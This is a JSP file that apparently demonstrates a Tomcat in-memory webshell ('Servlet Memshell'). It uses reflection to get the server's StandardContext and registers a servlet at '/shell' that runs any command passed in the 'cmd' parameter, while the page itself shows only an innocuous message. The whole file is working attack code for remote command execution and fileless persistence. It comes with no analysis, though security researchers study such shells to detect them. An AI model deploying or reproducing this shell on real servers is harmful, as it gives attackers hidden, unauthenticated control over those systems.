<%--
  Created by IntelliJ IDEA.
  User: ThreatBook
  Date: 2023/6/30
  Time: 22:18
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Wrapper" %>


<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();

    //System.out.println(standardContext);
    //StandardEngine[Tomcat].StandardHost[localhost].TomcatEmbeddedContext[]
%>

<%!
    public class Shell_Servlet implements Servlet {

        @Override
        public void init(ServletConfig servletConfig) throws ServletException {}

        @Override
        public ServletConfig getServletConfig() {
            return null;
        }

        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            String cmd = servletRequest.getParameter("cmd");
            if (cmd != null) {
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException | NullPointerException e){
                    e.printStackTrace();
                }
            }
        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        public void destroy() {}
    }
%>

<%
    Shell_Servlet shell_servlet = new Shell_Servlet();
    String name = shell_servlet.getClass().getSimpleName();

    //System.out.println(name);
    //Shell_Servlet

    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setLoadOnStartup(1);
    wrapper.setName(name);
    wrapper.setServlet(shell_servlet);
    wrapper.setServletClass(shell_servlet.getClass().getName());
%>

<%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/shell", name);
%>




<html>
<head>
    <title>Servlet Memshell</title>
</head>
<body>
    <br>普通jsp直接页面返回！！<br>
</body>
</html>
